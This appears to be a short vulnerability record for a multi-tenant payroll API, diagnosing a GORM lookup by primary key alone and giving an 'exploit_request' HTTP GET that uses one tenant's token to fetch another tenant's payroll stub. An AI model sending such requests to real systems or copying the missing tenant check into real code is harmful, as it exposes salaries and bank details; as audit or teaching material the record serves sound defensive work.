diagnosis: The GetPayrollStub method queries GORM using only the primary key stubID without constraining by the tenant_id of the requesting employee. In a multi-tenant payroll application, an employee from Company A can query payroll stubs belonging to Company B, exposing gross salaries, tax deductions, and bank routing numbers.
exploit_request:
GET /api/payroll/records/pay_9941 HTTP/1.1
Host: payroll.workforce-hr.com
Authorization: Bearer emp_token_tenant10
Accept: application/json
